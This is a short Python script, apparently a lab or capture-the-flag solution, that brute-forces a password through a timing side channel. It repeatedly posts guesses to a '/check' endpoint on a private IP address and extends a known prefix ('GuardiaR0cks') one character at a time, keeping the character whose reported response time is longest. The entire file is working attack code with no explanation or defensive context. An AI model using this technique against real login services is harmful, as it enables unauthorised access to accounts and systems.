import requests
import string
from numpy import mean


class OnEstDesBrutes:
    car = string.ascii_letters + string.digits

    def __init__(self):
        self.password = 'GuardiaR0cks'
        self.last_time = 150
        self.url = "http://192.168.137.146:5000/check"

    def request(self, letter: str):
        json = {
            "password": self.password + letter
        }
        response = requests.post(url=self.url, json=json, verify=False)
        if response.status_code == 200 or response.json()['result']:
            if response.json()['result']['Valid']:
                print(self.password + letter)
                return None
            return int(response.json()['result']['time'])
        else:
            print(f'Erreur : {response.status_code} : {response.text}')
            return
    
    def max_time(self, temps: list[int]) -> int | None:
        i = temps.index(max(temps))
        if len(temps) < 2:
            return
        tmp_mean = mean(temps[:i] + temps[i+1:])
        if temps[i] > tmp_mean + 15:
            return i
        
    def brut_force_l(self) -> None:
        time = []
        for l in self.car:

            t = 0
            while t < self.last_time:
                t = self.request(l)
                if not t:
                    return
                print(self.password + l, t)
            
            time.append(t)
            index = self.max_time(time)
            if index != None:
                self.password += self.car[index]
                return 1
        
        self.password += self.car[time.index(max(time))]
        self.last_time = max(time) - 20
        return 1
    
    def brut_force_password(self):
        while self.brut_force_l():
            print(self.password)

a = OnEstDesBrutes()
a.brut_force_password()